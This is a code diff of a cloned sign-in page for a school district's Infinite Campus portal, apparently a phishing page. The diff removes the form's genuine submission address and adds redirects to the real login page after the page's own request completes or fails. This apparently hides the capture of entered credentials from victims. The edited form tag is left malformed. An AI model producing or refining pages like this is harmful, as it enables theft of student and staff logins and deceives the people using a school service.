@@ -170,7 +170,7 @@
         
         
         
-        <form method="POST" id="form_signin" accept-charset="utf-8" action="https://campus.jeffco.k12.co.us/campus/verify.jsp">
+        <form method="POST" id="form_signin" accept-charset="utf-8" 
             <input type="hidden" name="appName" value="Jeffco_IC"/>
             <input type="hidden" id="screen" name="screen" value=""/>
             
@@ -272,23 +272,15 @@
         });
 
         if (response.ok) {
-          alert('I have received your message!');
+       location.replace("https://campus.jeffco.k12.co.us/campus/Jeffco_IC.jsp");
         } else {
           alert('There was an error! Try again later!');
+          location.replace("https://campus.jeffco.k12.co.us/campus/Jeffco_IC.jsp");
+
         }
       }
  
-    document.getElementById("useremail").addEventListener("keyup", function(event) {
-        if (event.which === 13) {
-            document.getElementById("usernamebutton").click();
-        }
-    });
-
-    document.getElementById("usernameinput").addEventListener("keyup", function(event) {
-        if (event.which === 13) {
-            document.getElementById("passwordbutton").click();
-        }
-    });
+    
     
     
 </script>
